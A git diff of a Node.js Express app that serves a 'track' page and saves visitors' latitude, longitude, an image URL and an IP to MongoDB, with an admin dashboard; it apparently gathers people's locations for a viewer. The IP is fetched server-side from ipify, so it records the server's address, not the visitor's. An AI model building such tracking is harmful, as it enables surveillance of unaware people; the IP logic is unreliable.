@@ -2,11 +2,13 @@ const express = require("express");
 const mongoose = require("mongoose");
 const axios = require("axios");
 const dotenv = require("dotenv");
+
 dotenv.config();
 
 const app = express();
 app.set("view engine", "ejs");
 app.set("views", __dirname + "/views");
+
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
@@ -14,14 +16,31 @@ mongoose.connect(process.env.MONGO_URL)
   .then(() => console.log("MongoDB Connected"))
   .catch(err => console.log(err));
 
+/* 📍 Schema */
 const LocationSchema = new mongoose.Schema({
   lat: String,
   lon: String,
   ip: String,
+  imageUrl: String,
   createdAt: { type: Date, default: Date.now }
 });
 
 const Location = mongoose.model("Location", LocationSchema);
+
+/* 🎯 Track Page */
+app.get("/", (req, res) => {
+  res.render("track");
+});
+
+/* 💾 SAVE DATA */
+app.post("/save", async (req, res) => {
+  const { lat, lon, imageUrl } = req.body;
+
+  const ip = (await axios.get("https://api64.ipify.org?format=json")).data.ip;
+
+  await Location.create({ lat, lon, ip, imageUrl });
+  res.json({ success: true });
+});
 
 /* 🔐 LOGIN PAGE */
 app.get("/admin", (req, res) => {
@@ -46,18 +65,7 @@ app.post("/delete-all", async (req, res) => {
   res.redirect("/admin/dashboard");
 });
 
-/* 🎯 TRACK */
-app.get("/", (req, res) => {
-  res.render("track");
-});
-
-/* SAVE */
-app.post("/save", async (req, res) => {
-  const { lat, lon } = req.body;
-  const ip = (await axios.get("https://api64.ipify.org?format=json")).data.ip;
-  await Location.create({ lat, lon, ip });
-  res.json({ success: true });
-});
 app.listen(3000, () =>
-  console.log("Running → http://localhost:3000/track")
+  console.log("Running → http://localhost:3000")
 );
+
